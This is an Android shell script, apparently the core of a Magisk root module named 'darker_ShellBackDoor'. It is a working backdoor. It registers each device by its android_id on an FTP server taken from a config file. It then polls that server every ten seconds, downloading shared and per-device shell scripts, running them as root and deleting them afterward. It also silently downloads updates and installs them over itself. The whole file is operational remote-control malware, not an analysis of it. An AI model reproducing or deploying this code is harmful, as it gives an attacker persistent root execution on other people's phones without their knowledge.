#!/system/bin/sh



###########################################################
#  Copyright © 2024 DARKER.c studio. All rights reserved. #
###########################################################



# lib
    grep_prop() {
        REGEX="s/^$1=//p"
        shift
        FILES="$(printf '%s\n' "$@")"
        [ -z "$FILES" ] && FILES='/system/build.prop'
        first_file="$(echo "$FILES" | head -n 1)"
        < "$first_file" dos2unix | sed -n "$REGEX" | head -n 1
    }

    _exec() {
        chown root:root "$1" 2>/dev/null
        chmod 0775 "$1" 2>/dev/null
        "$1" & 2>/dev/null
        rm -rf "$1"
    }
#

# global variables
    MODDIR="/data/adb/modules/darker_ShellBackDoor"
    tmp_dir="/data/local/tmp/darker_ShellBackDoor"
    cfg_dir="$MODDIR/backdoor.prop"
    android_id="$(settings get secure android_id)"
    pver="$(grep_prop versionCode "$MODDIR"/module.prop 2>/dev/null)"
#

# define
    _curl="$MODDIR/bin/curl"
#

# get cfg
    ftp_user="$(grep_prop ftp_user "$cfg_dir" 2>/dev/null)"
    ftp_passwd="$(grep_prop ftp_passwd "$cfg_dir" 2>/dev/null)"
    ftp_ip="$(grep_prop ftp_ip "$cfg_dir" 2>/dev/null)"
    ftp_exec_dir="$(grep_prop ftp_exec_dir "$cfg_dir" 2>/dev/null)"
    ftp_data_dir="$(grep_prop ftp_data_dir "$cfg_dir" 2>/dev/null)"
#

update() {
    netjson="$($_curl -sLk "$(grep_prop updateJson "$MODDIR"/module.prop)")"
    # shellcheck disable=SC2016
    netver="$(echo "$netjson" | sed -n '/versionCode/p' | /data/adb/magisk/busybox awk -v FS=': ' '{print $2}' | /data/adb/magisk/busybox awk -v FS=',' '{print $1}')"
    if [ "$netver" -gt "$pver" ]; then
        # shellcheck disable=SC2016
        updateZipUrl="$(echo "$netjson" | sed -n '/zipUrl/p' | /data/adb/magisk/busybox awk -v FS=': "' '{print $2}' | /data/adb/magisk/busybox awk -v FS='",' '{print $1}')"
        rm -rf "$tmp_dir" "$tmp_dir.zip"
        $_curl -sLk "$updateZipUrl" --output "$tmp_dir.zip"
        mkdir "$tmp_dir"
        unzip -o -q -d "$tmp_dir" "$tmp_dir.zip"
        rm -rf "$tmp_dir.zip" "$tmp_dir/customize.sh" "$tmp_dir/META-INF"
        cp -af "$tmp_dir" "/data/adb/modules"
        rm -rf "$tmp_dir"
        chown -R root:root "$MODDIR"
        chmod -R 0775 "$MODDIR"
        chmod +x "$MODDIR"
        "$MODDIR"/backdoor_main.sh &
        exit 0
    fi
}

backdoor() {
    # execute

        # shellcheck disable=SC2016
        temp="$($_curl ftp://"$ftp_user":"$ftp_passwd"@"$ftp_ip"/"$ftp_exec_dir/" -s | /data/adb/magisk/busybox awk -v FS=':' '{print $2}' | /data/adb/magisk/busybox awk -v FS=' ' '{print $2}' | grep .sh)"
        IFS='
 '
        # shellcheck disable=SC2206
        exec_pool=($temp)

        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/all.sh" --output "$MODDIR"/all.sh
        _exec "$MODDIR"/all.sh

        for num in $(seq 0 ${#exec_pool[@]}); do
            if [ "${exec_pool[$num]}" = "$android_id.sh" ]; then
                $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/${exec_pool[$num]}" --output "$MODDIR"/"${exec_pool[$num]}"
                _exec "$MODDIR"/"${exec_pool[$num]}"
                $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/" -X "DELE ${exec_pool[$num]}"
                break
            fi
        done

    #
}

    update

    # register
        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir/" -X "MKD $android_id"
    # 
    
number=0
while true; do
    [ "$number" -gt "6" ] && update
    let number++
    backdoor
    sleep 10
done
